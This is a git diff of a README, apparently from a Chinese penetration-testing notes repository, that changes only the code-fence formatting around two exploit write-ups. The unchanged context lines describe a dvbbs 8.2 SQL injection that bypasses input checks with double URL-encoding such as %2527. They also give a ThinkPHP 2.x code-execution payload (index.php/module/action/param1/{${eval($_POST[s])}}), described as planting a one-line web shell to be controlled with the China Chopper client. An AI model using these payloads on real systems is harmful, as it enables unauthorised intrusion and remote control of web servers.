@@ -9,7 +9,7 @@ https://github.com/w1109790800/Permeable
 
 ### 下面是几个文件的具体内容:
 #### dvbbs 8.2 SQL注射漏洞分析
-'''
+```php
 [dvbbs 8.2 SQL注射漏洞分析 全文]漏洞公告:http://seclists.org/bugtraq/2008/May/0330.html
 
 利用方式:一个典型的sql注射漏洞,按照公告里说的用
@@ -29,10 +29,10 @@ If ajaxPro Then username = unescape(username)
 取得的username是先经过检查然后再unescape解码,导致用urlencode模式就可以饶过任何检查,和php的urldecode导致的注射很类似,譬如用%2527就可以提交’过去了. 
 
 
-'''
+```
 
 #### ThinkPHP 漏洞
-'''
+```php
 2.0版本 /ThinkPHP/Lib/Think/Util/Dispatcher.class.php
 
 2.1版本/ThinkPHP/Lib/Core/Dispatcher.class.php
@@ -69,4 +69,4 @@ index.php/module/action/param1/{${eval($_POST[s])}}
 
 直接执行一句话代码，用菜刀直接连接.
 
-'''
+```
